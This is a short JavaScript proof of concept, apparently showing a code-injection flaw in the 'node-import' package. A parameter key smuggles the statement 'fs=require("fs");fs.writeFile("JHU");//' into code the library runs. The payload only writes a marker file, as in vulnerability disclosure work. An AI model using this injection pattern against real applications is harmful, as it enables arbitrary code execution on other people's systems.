var a = require("node-import");
var params = {
  'fs=require("fs");fs.writeFile("JHU");//':123
}
a.module('x',params,true)
